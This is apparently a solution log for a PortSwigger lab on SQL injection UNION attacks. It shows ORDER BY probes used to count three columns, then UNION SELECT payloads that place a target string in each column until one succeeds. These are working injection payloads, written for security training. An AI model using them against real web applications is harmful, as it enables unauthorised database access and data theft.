--Name: SQL injection UNION attack, finding a column containing text
--URL:https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
--Level:Medium Time: 7 min
---------------------------------------------------------------------------------

-- Make the database retrieve the string: '0K9lfx'


SELECT * FROM products WHERE category = 'Pets'-- ???
SELECT * FROM products WHERE category = 'Pets' ORDER BY 1 -- ???     OK
SELECT * FROM products WHERE category = 'Pets' ORDER BY 2 -- ???     OK
SELECT * FROM products WHERE category = 'Pets' ORDER BY 3 -- ???     OK
SELECT * FROM products WHERE category = 'Pets' ORDER BY 4 -- ???     Error


SELECT ?, ?, ? FROM products WHERE category = 'Pets' UNION SELECT NULL, NULL, NULL-- ???    OK 
SELECT ?, ?, ? FROM products WHERE category = 'Pets' UNION SELECT '0K9lfx', NULL, NULL-- ???    ERROR
SELECT ?, ?, ? FROM products WHERE category = 'Pets' UNION SELECT NULL, '0K9lfx', NULL-- ???    SOLVED